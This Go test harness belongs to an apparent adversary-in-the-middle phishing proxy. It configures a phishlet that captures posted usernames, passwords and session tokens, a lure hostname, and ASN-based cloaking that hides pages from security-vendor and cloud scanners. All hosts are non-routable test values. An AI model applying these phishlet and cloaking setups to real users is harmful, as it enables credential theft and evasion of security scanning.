// This file simulates stage (b) "gateway ingestion" and stage (c) "bot &
// cloaking defense" together, because both live on the same real listener:
// HttpProxy.Start() (pkg/proxy/core/http_proxy.go:2123) spawns httpsWorker
// (http_proxy.go:1831), which binds a genuine TCP listener on
// p.Server.Addr, SNI-sniffs incoming TLS connections with vhost.TLS, and
// hands them to goproxy's MITM CONNECT handling for real TLS termination
// via a self-signed certificate minted by CertDb - all without any
// production code changes.
//
// What this harness could NOT drive end-to-end, and why:
//
//  1. Upstream pass-through (proxy -> outbound uTLS transport -> local
//     httptest backend) is not reachable from an external test package.
//     HttpProxy.outboundTransport (the *utlstransport.Transport instance
//     wired into every outbound request via ctx.RoundTripper) is an
//     unexported field with no exported setter, so SetDialContext cannot be
//     pointed at a local server from outside pkg/proxy/core.
//
//  2. Independent of (1), reaching a phish *landing* hostname (as opposed
//     to a standalone lure hostname) in developer-mode certificate issuance
//     is architecturally incompatible with "no external network access":
//     CertDb.getSelfSignedCertificate (certdb.go:271) only skips its
//     getTLSCertificate helper when the requested host is itself a
//     registered lure hostname (phish_host == ""); for any other active
//     hostname it calls getTLSCertificate, which does a real tls.Dial to
//     the *original* upstream host to clone its certificate template. There
//     is no way to reach the "session/lure creates and forwards" code path
//     (http_proxy.go's big OnRequest DoFunc) without first passing through
//     that cert-issuance step for a non-lure hostname - so exercising it
//     would mean either a live network dial (forbidden) or a DNS lookup for
//     an unroutable name (also outbound network activity, and slow/flaky
//     under sandboxed CI). This harness never dials a phish landing
//     hostname for that reason.
//
//     A standalone lure hostname sidesteps (2) (self-signed cert issuance
//     never dials out for it) but runs into a different production
//     behavior: http_proxy.go's request pipeline unconditionally returns
//     404 for any request whose Host is itself a valid lure hostname,
//     before it would ever reach forwarding logic. So this harness gets a
//     real listener, a real SNI-routed MITM TLS handshake, and the full
//     goproxy OnRequest pipeline (jsInspect, then asncloak, exactly in
//     their production registration order) executing for real over that
//     connection - genuine wire-level "gateway ingestion" - but stops
//     short of an actual upstream fetch. That gap is a property of the
//     target code, not a shortcut taken here.
//
//  3. HTTP/2 over the MITM'd connection: developer-mode TLS configuration
//     (TLSConfigFromCA's else branch) never sets tls.Config.NextProtos, so
//     the server-side handshake cannot select "h2" over ALPN no matter what
//     the client offers, and goproxy's decrypted-connection reader expects
//     HTTP/1.1 text. This harness proves that directly: it completes a TLS
//     handshake offering "h2" in NextProtos and asserts the negotiated
//     protocol is never "h2". The actual h1-vs-h2 ALPN differentiation this
//     task calls for is instead proven against the outbound uTLS transport
//     directly in outbound_transport_test.go, which is the exact mechanism
//     (github.com/s4l1hs/olta/pkg/proxy/transport/utls) HttpProxy uses
//     internally for its outbound leg.
//
// HttpProxy also exposes no Stop()/Close(): once Start() is called,
// httpsWorker's Accept() loop cannot be unblocked from outside the package
// (see lifecycle_test.go's goroutine-leak accounting for the one goroutine
// this permanently and unavoidably leaks for the rest of the test binary's
// life).
package e2e

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"

	core "github.com/s4l1hs/olta/pkg/proxy/core"
	"github.com/s4l1hs/olta/pkg/proxy/database"
	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
	"github.com/s4l1hs/olta/pkg/proxy/middleware/jsinspect"
)

const (
	gatewayBaseDomain = "e2e-phish.invalid"
	gatewayLureHost   = "e2e-lure.invalid"
	gatewaySite       = "e2esite"
	jsInspectEndpoint = "/_assets/js/v.js"
	cloakScannerIP    = "203.0.113.9" // TEST-NET-3 (RFC 5737): documentation-only, never routable.
)

// minimalPhishletYAML is a complete, minimal phishlet definition satisfying
// every section NewPhishlet.LoadFromFile requires (proxy_hosts, auth_tokens,
// credentials, login). Its upstream domain is never dialed: every request
// this harness sends targets gatewayLureHost, a standalone lure hostname,
// specifically to avoid the real-network certificate-cloning dial described
// in this file's package doc.
const minimalPhishletYAML = `author: 'olta-e2e'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: 'www', domain: 'e2e-upstream.invalid', session: true, is_landing: true}

auth_tokens:
  - domain: 'e2e-upstream.invalid'
    keys: ['session_token']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.e2e-upstream.invalid'
  path: '/login'
`

// gatewayFixture is a fully wired, Start()-ed HttpProxy plus the client
// dial parameters needed to reach it.
type gatewayFixture struct {
	proxy   *core.HttpProxy
	db      *database.Database
	addr    string // 127.0.0.1:<port>, the real bound address.
	tlsHost string // SNI / Host to present: gatewayLureHost.
}

// newGatewayFixture builds a Config with one enabled phishlet and one
// standalone lure hostname, wires the cloaker and JS inspector via the
// exported ConfigureCloaker/ConfigureJSInspect hooks, and Starts a real
// HttpProxy listener on an OS-assigned loopback port.
func newGatewayFixture(t *testing.T, cloakConfig asncloak.Config, jsConfig jsinspect.Config) *gatewayFixture {
	t.Helper()
	dir := t.TempDir()

	cfg, err := core.NewConfig(dir, "")
	if err != nil {
		t.Fatalf("NewConfig() error: %v", err)
	}
	// NewConfig defaults general.UnauthUrl to a real external redirect
	// target; clearing it makes an unauthorized/unmatched request resolve
	// to a clean, deterministic 403 instead of a 200 carrying a redirect to
	// that URL, and (as a side effect of never being non-empty) guarantees
	// blockRequest never even constructs a response containing it.
	cfg.SetUnauthUrl("")

	yamlPath := filepath.Join(dir, "e2esite.yaml")
	if err := os.WriteFile(yamlPath, []byte(minimalPhishletYAML), 0o600); err != nil {
		t.Fatalf("writing phishlet fixture: %v", err)
	}
	phishlet, err := core.NewPhishlet(gatewaySite, yamlPath, nil, cfg)
	if err != nil {
		t.Fatalf("NewPhishlet() error: %v", err)
	}
	cfg.AddPhishlet(gatewaySite, phishlet)

	cfg.SetBaseDomain(gatewayBaseDomain)
	if !cfg.SetSiteHostname(gatewaySite, gatewayBaseDomain) {
		t.Fatal("SetSiteHostname() returned false")
	}
	cfg.AddLure(gatewaySite, &core.Lure{
		Hostname: gatewayLureHost,
		Phishlet: gatewaySite,
		Path:     "/go",
	})
	if err := cfg.SetSiteEnabled(gatewaySite); err != nil {
		t.Fatalf("SetSiteEnabled() error: %v", err)
	}
	if !cfg.IsActiveHostname(gatewayLureHost) {
		t.Fatalf("fixture setup did not activate lure hostname %q", gatewayLureHost)
	}
	if !cfg.IsLureHostnameValid(gatewayLureHost) {
		t.Fatalf("fixture setup did not register %q as a valid lure hostname", gatewayLureHost)
	}

	certDb, err := core.NewCertDb(filepath.Join(dir, "crt"), cfg, nil)
	if err != nil {
		t.Fatalf("NewCertDb() error: %v", err)
	}

	db, err := database.NewDatabase(filepath.Join(dir, "olta.db"))
	if err != nil {
		t.Fatalf("database.NewDatabase() error: %v", err)
	}
	// HttpProxy itself exposes no Stop()/Close() (see this file's package
	// doc), so the listener goroutine Start() spawns cannot be released
	// here - but the session database it was handed is independently
	// closeable, and closing it stops its own background persistence
	// goroutine cleanly.
	t.Cleanup(func() {
		if err := db.Close(); err != nil {
			t.Errorf("closing gateway fixture database: %v", err)
		}
	})

	blPath := filepath.Join(dir, "blacklist.txt")
	if err := core.SaveToFile(nil, blPath, 0o600); err != nil {
		t.Fatalf("SaveToFile() error: %v", err)
	}
	bl, err := core.NewBlacklist(blPath, nil)
	if err != nil {
		t.Fatalf("NewBlacklist() error: %v", err)
	}

	port := freeLoopbackPort(t)
	// developer=true selects TLSConfigFromCA's self-signed branch (never
	// the ACME/certmagic path), which is what keeps certificate issuance
	// hermetic. rateLimit=0 disables the request-rate limiter.
	proxy, err := core.NewHttpProxy("127.0.0.1", port, cfg, certDb, db, noopCampaignEventSink{}, bl, true, false, 0, 0)
	if err != nil {
		t.Fatalf("NewHttpProxy() error: %v", err)
	}
	if err := proxy.ConfigureCloaker(cloakConfig); err != nil {
		t.Fatalf("ConfigureCloaker() error: %v", err)
	}
	if err := proxy.ConfigureJSInspect(jsConfig); err != nil {
		t.Fatalf("ConfigureJSInspect() error: %v", err)
	}

	addr := fmt.Sprintf("127.0.0.1:%d", port)
	if err := proxy.Start(); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	waitForListening(t, addr, 5*time.Second)

	return &gatewayFixture{proxy: proxy, db: db, addr: addr, tlsHost: gatewayLureHost}
}

// client returns an http.Client whose transport dials straight at the
// fixture's real listener address while presenting tlsHost as both TLS SNI
// and the request Host, and trusts the proxy's self-signed certificate the
// same way a captured victim browser configured to ignore the warning
// would.
func (f *gatewayFixture) client() *http.Client {
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	transport := &http.Transport{
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, f.addr)
		},
		TLSClientConfig: &tls.Config{
			ServerName:         f.tlsHost,
			InsecureSkipVerify: true,
		},
	}
	return &http.Client{Transport: transport, Timeout: 5 * time.Second}
}

func (f *gatewayFixture) newRequest(t *testing.T, method, path string, body []byte) *http.Request {
	t.Helper()
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, "https://"+f.tlsHost+path, reader)
	if err != nil {
		t.Fatalf("NewRequest() error: %v", err)
	}
	return req
}

// fixtureCloudProvider is a small, hand-built asncloak.Provider covering
// exactly one documentation-only CIDR (RFC 5737 TEST-NET-3), rather than
// asncloak.NewDefaultProvider()'s much larger bundled table or (worse) the
// live AWS/GCP/Azure/Palo Alto feeds pkg/proxy/middleware/asncloak/sync.go
// can refresh it from. Nothing here ever calls into sync.go.
func fixtureCloudProvider(t *testing.T) asncloak.Provider {
	t.Helper()
	provider, err := asncloak.NewLocalProvider([]asncloak.Entry{
		{CIDR: cloakScannerIP + "/32", ASN: 64512, Organization: "E2E Fixture Cloud", Category: asncloak.CategoryCloud},
	})
	if err != nil {
		t.Fatalf("NewLocalProvider() error: %v", err)
	}
	return provider
}
